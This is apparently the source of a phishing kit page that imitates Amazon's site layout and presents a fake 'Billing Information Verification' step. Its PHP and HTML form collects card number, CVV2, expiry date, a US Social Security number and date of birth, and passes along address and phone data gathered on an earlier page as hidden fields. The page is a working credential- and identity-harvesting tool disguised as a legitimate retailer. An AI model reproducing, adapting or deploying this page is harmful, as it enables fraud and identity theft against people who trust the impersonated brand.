...
--></script>
  ...
  <!-- navp-aDkKITWePJ9p6StV7eatZEx9UN2Eswlk61FdE/86rr2kp3OF0YzH+65CKoxNkteS rid-193ZPE3D1WGBZBPZJ9ET templated -->
  ...
  <div id='navbar' class='nav-beacon nav-prime nav-logo-small'>
    ...
    <div id='nav-cross-shop'>
      ...
      <ul id='nav-cross-shop-links' >
                      <li class='nav-xs-link first'><a href='#' class='nav_a' id='nav-your-amazon'>
						Amazon.com</a></li>
                          <li class='nav-xs-link '><a href='#' class='nav_a'>
							Today's Deals</a></li>
                          <li class='nav-xs-link '><a href='#' class='nav_a'>
							Gift Cards</a></li>
                          <li class='nav-xs-link '><a href='#' class='nav_a'>
        ...
        <div>
          ...
          >
            ...
            <span id='nav-search-in' class='nav-sprite'>
              ...
              <span class='nav-down-arrow nav-sprite'></span>
              <select name="url" id="searchDropdownBox" class="searchSelect" title="Search in"   ><option value="search-alias=aps" selected="selected">
				All Departments</option><option value="search-alias=instant-video">
				Amazon Instant Video</option><option value="search-alias=appliances">
				Appliances</option><option value="search-alias=mobile-apps">Apps 
				for Android

</option><option value="search-alias=arts-crafts">Arts, Crafts &amp; Sewing</option><option value="search-alias=automotive">
				Automotive</option><option value="search-alias=baby-products">
				Baby</option><option value="search-alias=beauty">Beauty</option><option value="search-alias=stripbooks">
				Books</option><option value="search-alias=mobile">Cell Phones &amp; 
				Accessories</option><option value="search-alias=apparel">
				Clothing &amp; Accessories</option><option value="search-alias=collectibles">
				Collectibles</option><option value="search-alias=computers">
				Computers</option><option value="search-alias=electronics">
				Electronics</option><option value="search-alias=gift-cards">Gift 
				Cards</option><option value="search-alias=grocery">Grocery &amp; 
				Gourmet Food</option><option value="search-alias=hpc">Health &amp; 
				Personal Care</option><option value="search-alias=garden">Home &amp; 
				Kitchen</option><option value="search-alias=industrial">
				Industrial &amp; Scientific</option><option value="search-alias=jewelry">
				Jewelry</option><option value="search-alias=digital-text">Kindle 
				Store</option><option value="search-alias=magazines">Magazine 
				Subscriptions</option><option value="search-alias=movies-tv">
				Movies &amp; TV</option><option value="search-alias=digital-music">
				MP3 Downloads</option><option value="search-alias=popular">Music</option><option value="search-alias=mi">
				Musical Instruments</option><option value="search-alias=office-products">
				Office Products</option><option value="search-alias=lawngarden">
				Patio, Lawn &amp; Garden</option><option value="search-alias=pets">
				Pet Supplies</option><option value="search-alias=shoes">Shoes</option><option value="search-alias=software">
				Software</option><option value="search-alias=sporting">Sports &amp; 
				Outdoors</option><option value="search-alias=tools">Tools &amp; Home 
				Improvement</option><option value="search-alias=toys-and-games">
				Toys &amp; Games</option><option value="search-alias=videogames">
				Video Games</option><option value="search-alias=watches">Watches</option></select>
            </span>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Prime Instant Videos</a><div class="nav_tag">
	Unlimited streaming of thousands of<br />movies and TV shows with Amazon 
	Prime</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Learn More About Amazon Prime</a></li>
<li class="nav_pop_li  nav_divider_before"><a href="#" class="nav_a">Amazon 
Instant Video Store</a><div class="nav_tag">Rent or buy hit movies and TV shows<br />
	to stream or download</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Your Watchlist</a><div class="nav_tag">
	Organize movies and TV seasons<br />you want to watch later</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Your Video Library</a><div class="nav_tag">
	Your movies and TV shows<br />stored in the cloud</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Watch Anywhere</a><div class="nav_tag">
	Watch instantly on your Kindle Fire,<br />TV, Blu-ray player, or set-top box</div></li>
  </ul>
</div>
...
<li class="nav_pop_li "><a href="#" class="nav_a">MP3 Music Store</a><div class="nav_tag">
	Shop 20 million songs</div></li>
<li class="nav_pop_li "><a href="#" target="_blank" class="nav_a">Cloud Player 
for Web</a><div class="nav_tag">Play from any browser</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Cloud Player for Android</a><div class="nav_tag">
	For Android and Kindle Fire</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Cloud Player for iOS</a><div class="nav_tag">
	For iPhone and iPod touch</div></li>
  </ul>
</div>
...
<li class="nav_pop_li "><a href="#" target="_blank" class="nav_a">Your Cloud 
Drive</a><div class="nav_tag">5 GB of free storage</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Get the Desktop App</a><div class="nav_tag">
	For Windows and Mac</div></li>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Kindle $79</a><div class="nav_tag">
	Lighter, smaller, faster</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Kindle Touch $99</a><div class="nav_tag">
	Simple-to-use touchscreen</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Kindle Touch 3G $149</a><div class="nav_tag">
	The top-of-the-line e-reader</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Kindle Fire $199</a><div class="nav_tag">
	Vibrant color, movies, apps, and more</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Kindle DX $379</a><div class="nav_tag">
	Large 9.7&quot; E Ink Display</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Accessories</a></li>
<li class="nav_pop_li  nav_divider_before"><a href="#" class="nav_a">Kindle 
Owners' Lending Library</a><div class="nav_tag">With Prime, Kindle owners read 
	for free</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Kindle Cloud Reader</a><div class="nav_tag">
	Read your Kindle books in a browser</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Free Kindle Reading Apps</a><div class="nav_tag">
	For PC, iPad, iPhone, Android, and more</div></li>
...
<li class="nav_pop_li  nav_divider_before"><a href="#" class="nav_a">Test Drive 
Apps</a><div class="nav_tag">Try thousands of apps and games right now</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Amazon Apps</a><div class="nav_tag">
	Kindle, mobile shopping, MP3, and more</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Your Apps and Devices</a><div class="nav_tag">
	View your apps and manage your devices</div></li>
  </ul>
</div>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Game Downloads</a><div class="nav_tag">
	For PC and Mac</div></li>
<li class="nav_pop_li "><a href="#" class="nav_a">Software Downloads</a><div class="nav_tag">
	For PC and Mac</div></li>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Audible Membership</a><div class="nav_tag">
	Get to know Audible</div></li>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Computer Accessories &amp; 
Peripherals</a><div class="nav_tag">External drives, mice, networking &amp; more</div></li>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Appliances</a></li>
<li class="nav_pop_li  nav_divider_before"><a href="#" class="nav_a">Patio, Lawn 
&amp; Garden</a></li>
<li class="nav_pop_li  nav_divider_before"><a href="#" class="nav_a">Home 
Improvement</a></li>
...
<li class="nav_pop_li  nav_divider_before"><a href="#" class="nav_a">Arts, 
Crafts &amp; Sewing</a></li>
...
<li class="nav_pop_li "><a href="#" class="nav_a">Janitorial &amp; Sanitation 
Supplies</a></li>
...
<li id="nav_cat_1" class="nav_pop_li nav_cat">MP3s &amp; Cloud Player<div class="nav_tag">
	20 million songs, play anywhere</div></li>
<li id="nav_cat_2" class="nav_pop_li nav_cat">Amazon Cloud Drive<div class="nav_tag">
	5 GB of free storage</div></li>
<li id="nav_cat_3" class="nav_pop_li nav_cat">Kindle</li>
<li id="nav_cat_4" class="nav_pop_li nav_cat">Appstore for Android<div class="nav_tag">
	Get a premium app for free today<span id="nav_amabotandroid"></span></div></li>
...
<li id="nav_fullstore" class="nav_pop_li nav_divider_before nav_last_li nav_a_carat">
           <span class="nav_a_carat">›</span><a href="#" class="nav_a">Full 
			Store Directory</a></li>
...
<div id="nav_your_account_flyout">  <ul class="nav_pop_ul">
 ...
 <li class="nav_pop_li"><a href="#" class="nav_a" id="nav_prefetch_yourorders">
	Your Orders</a></li>
 ...
 <li class="nav_pop_li nav_divider_before"><a href="#" class="nav_a">Manage Your 
	Kindle</a></li>
 <li class="nav_pop_li"><a href="#" class="nav_a">Your Cloud Player</a><div class="nav_tag">
	Play from any browser</div></li>
 <li class="nav_pop_li"><a href="#" class="nav_a">Your Cloud Drive</a><div class="nav_tag">
	5 GB of free storage</div></li>
 <li class="nav_pop_li"><a href="#" class="nav_a">Prime Instant Videos</a><div class="nav_tag">
	Unlimited streaming of thousands<br />of movies and TV shows</div></li>
 ...
 <li class="nav_pop_li nav_divider_before nav_last_li"><a href="#" class="nav_a">
	Sign Out</a></li>
   </ul> </div>
...
<div id="nav_cart_flyout" class="nav-empty">
  ...
  <div class='nav-dynamic-empty'>
    ...
    <p class='nav_p '> Give it purpose—fill it with books, DVDs, clothes, 
  ...
  <div class='nav-ajax-error-msg'>
    ...
    <p class='nav_p '> Check your Internet connection and <a href="#" class="nav_a">
	go to your cart</a>, or <a href='javascript:void(0);' class='nav_a nav-try-again'>
	try again</a>.</p>
  </div>
      ...
      <span class='nav-ajax-success'>
        <span id='nav-cart-one' style='display: none;'>(<span class='nav-cart-count'>0</span> 
	item)</span>
        <span id='nav-cart-many'>(<span id='nav-cart-count-flyout' class='nav-cart-count'>0</span> 
	items)</span>
      </span>
    </span></a>
...
<div id="nav_wishlist_flyout" class="nav-empty">
  ...
  <ul class="nav_pop_ul">
     <li class="nav_pop_li nav-dynamic-empty"><a href="#" class="nav_a">Create a 
		Wish List</a></li>
 <li class="nav_pop_li"><a href="#" class="nav_a">Find a Wish List or Registry</a></li>
 <li class="nav_pop_li"><a href="#" class="nav_a">Wish from Any Website</a><div class="nav_tag">
	Add items to your List from anywhere</div></li>
...
<td valign="bottom">
<b class="h1">
<nobr><a href="#">Your Account</a></nobr> &gt; <nobr><a href="#">Billing Center</a></nobr> 
&gt; <nobr><h1 class="h1" style="display: inline;">Billing Information Verification</h1></nobr></b>
</td>
</tr>
</table>
<br />
...
<table width="100%" border="0" cellpadding="2">
  <tr>
    <td>
      <b class="h1">Enter your card information: </b>
    </td>
  </tr>
...
";
if ($NameOncArd == 1){
	print ("<li>Please Enter your name exactly as it appears on your credit card.</font></li>");
}
...
if ($CVV2C == 1){
	print ("<li> Credit card security number is invalid.</li>");
}

if (($ExpMonth == 1)||($ExpYear == 1)){
	print ("<li> Card expiration date is invalid.</li>");
}
...
$().ready(function() {
	...
	$("#signupForm").validate({
		rules: {
			NameonCards: "required",
			Cardanumber: "required",
			CVV2: "required",
			Expiredatesss: "required",
...
<input type="hidden" name="FullNamer" value="<?php echo $_POST["FullNamer"]; ?>"/>  
<input type="hidden" name="Address11" value="<?php echo $_POST["Address11"]; ?>"/>
<input type="hidden" name="Address2" value="<?php echo $_POST["Address2"]; ?>"/>  
<input type="hidden" name="CityName" value="<?php echo $_POST["CityName"]; ?>"/>
<input type="hidden" name="StateN" value="<?php echo $_POST["StateN"]; ?>"/>  
<input type="hidden" name="ZipCode" value="<?php echo $_POST["ZipCode"]; ?>"/>
<input type="hidden" name="CountryNa" value="<?php echo $_POST["CountryNa"]; ?>"/>  
<input type="hidden" name="Phone221" value="<?php echo $_POST["Phone221"]; ?>"/>
...
<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="NameonCards"><b>
	Name on card:&nbsp;</b></label></span></td><td><span>
<input type="text" name="NameonCards" id="NameonCards" class="NameonCards" size="50" maxlength=50 value="<?php echo $_POST["FullNamer"]; ?>"/></span>
</td></tr>


<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine1"><b>
	Card number:&nbsp;</b></label></span></td>
<td><span>
<input type="text" name="Cardanumber" id="Cardanumber" class="enterAddressFormField" size="50" maxlength=60/></span>
<br /><span class="tiny">no dashes or spaces</span></td></tr>

<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="enterAddressAddressLine2"><b>
	CVV2:&nbsp;</b></label></span></td>
<td><span>
<input type="text" name="CVV2" id="CVV2" class="enterAddressFormField" size="50" maxlength=60/></span>
...
<select name="Expiredatesss" <? echo $Expiredatesss?>>
...
<select name="expdate_year" size="1"  <? echo $expdate_year?>>
...
<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="ssn21124"><b>
	SSN (USA):</b></label></span></td><td><span>
<input type="text" name="ssn21124" id="ssn21124" class="enterAddressFormField" size="20" maxlength=20/></span>
</td></tr>

<tr><td class="enterAddressFieldLabel" style="vertical-align:middle;"><span><label for="DOBDATES"><b>
	Date of Birth:</b></label></span></td><td><span>
</span>
<input type="text" id="dobday" size="3" class="smallInputWidth"maxlength="2" name="dobday">/
<input type="text" id="dobmonth" size="3" class="smallInputWidth" maxlength="2" name="dobmonth">/
 <input type="text" id="dobyear" size="4" class="smallInputWidth"maxlength="4" name="dobyear">
                          (DD/MM/YYYY) 
</span>
</td></tr>
</div><input type="hidden" name="enterAddressIsDomestic" value="0" />
...
<tr>
    ...
    <table border="0" width="20%">
        ...
        <td WIDTH="10%">&nbsp;<input type="hidden" name="isDomestic" value="0" />
            <input type="image" src="content/confirm-card._V17236_.png"  width="108" alt="Save & Continue" value="Save & Continue" name="newAddress" height="22" border="0" />
        </td>
        </tr>
    </table>
    </td>
...
<li><span class="navFooterRightArrowBullet">›</span> <a href="#">See all</a></li>
</ul>
</td>
<td class="navFooterColSpacerInner"></td>
<td class="navFooterLinkCol">
...
<td class="navFooterDescItem"><a href="#">AbeBooks<br/> <span class="navFooterDescText">
Rare Books<br/> &amp; Textbooks</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">AmazonLocal<br/> <span class="navFooterDescText">
Great Local Deals<br/> in Your City</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">AmazonSupply<br/> <span class="navFooterDescText">
Business, Industrial<br/> &amp; Scientific Supplies</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">AmazonWebServices<br/> <span class="navFooterDescText">
Scalable<br/> Cloud Services</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">AmazonWireless<br/> <span class="navFooterDescText">
Cellphones &amp;<br/> Wireless Plans</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Askville<br/> <span class="navFooterDescText">
Community<br/> Answers</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Audible<br/> <span class="navFooterDescText">
Download<br/> Audio Books</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">BeautyBar.com<br/> <span class="navFooterDescText">
Prestige Beauty<br/> Delivered</span></a></td>
<td class="navFooterDescSpacer" style="width: 36.0%"></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescSpacer" style="width: 36.0%"></td>
<td class="navFooterDescItem"><a href="#">Book Depository<br/> <span class="navFooterDescText">
Books With Free<br/> Delivery Worldwide</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">CreateSpace<br/> <span class="navFooterDescText">
Indie Publishing<br/> Made Easy</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Diapers.com<br/> <span class="navFooterDescText">
Everything<br/> But The Baby</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">DPReview<br/> <span class="navFooterDescText">
Digital<br/> Photography</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Fabric<br/> <span class="navFooterDescText">
Sewing, Quilting<br/> &amp; Knitting</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">IMDb<br/> <span class="navFooterDescText">
Movies, TV<br/> &amp; Celebrities</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Junglee.com<br/> <span class="navFooterDescText">
Shop Online<br/> in India</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">MYHABIT<br/> <span class="navFooterDescText">
Private Fashion<br/> Designer Sales</span></a></td>
<td class="navFooterDescSpacer" style="width: 36.0%"></td>
</tr>
<tr><td>&nbsp;</td></tr>
<tr>
<td class="navFooterDescSpacer" style="width: 36.0%"></td>
<td class="navFooterDescItem"><a href="#">Shopbop<br/> <span class="navFooterDescText">
Designer<br/> Fashion Brands</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Soap.com<br/> <span class="navFooterDescText">
Health, Beauty &amp;<br/> Home Essentials</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Wag.com<br/> <span class="navFooterDescText">
Everything<br/> For Your Pet</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Warehouse Deals<br/> <span class="navFooterDescText">
Open-Box<br/> Discounts</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Woot<br/> <span class="navFooterDescText">
Never Gonna<br/> Give You Up</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Yoyo.com<br/> <span class="navFooterDescText">
A Happy Place<br/> To Shop For Toys</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
<td class="navFooterDescItem"><a href="#">Zappos<br/> <span class="navFooterDescText">
Shoes &amp;<br/> Clothing</span></a></td>
<td class="navFooterDescSpacer" style="width: 4%"></td>
